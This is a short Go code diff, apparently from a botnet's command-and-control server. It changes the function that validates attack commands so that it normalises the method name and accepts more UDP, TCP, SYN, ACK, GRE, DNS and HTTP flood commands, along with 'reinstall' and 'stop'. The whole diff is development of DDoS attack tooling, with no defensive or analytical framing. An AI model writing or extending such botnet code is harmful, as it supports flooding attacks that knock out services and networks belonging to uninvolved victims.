@@ -11,6 +11,7 @@ import (
 	"net"
 	"net/http"
 	"strconv"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -679,18 +680,38 @@ func ReceivePacket(conn net.Conn) (Packet, error) {
 }
 
 func validateCommand(method string) bool {
+	// Normalize the method name
+	method = strings.ToLower(strings.TrimSpace(method))
+
 	validCommands := map[string]bool{
-		"!udpsmart":  true,
+		"udp":        true,
+		"udpflood":   true,
 		"!udpflood":  true,
+		"udpsmart":   true,
+		"!udpsmart":  true,
+		"tcp":        true,
+		"tcpflood":   true,
 		"!tcpflood":  true,
+		"syn":        true,
+		"synflood":   true,
 		"!synflood":  true,
+		"ack":        true,
+		"ackflood":   true,
 		"!ackflood":  true,
+		"gre":        true,
+		"greflood":   true,
 		"!greflood":  true,
+		"dns":        true,
 		"!dns":       true,
+		"http":       true,
+		"httpflood":  true,
 		"!http":      true,
+		"reinstall":  true,
 		"!reinstall": true,
+		"stop":       true,
 		"STOP":       true,
 	}
+
 	return validCommands[method]
 }
 
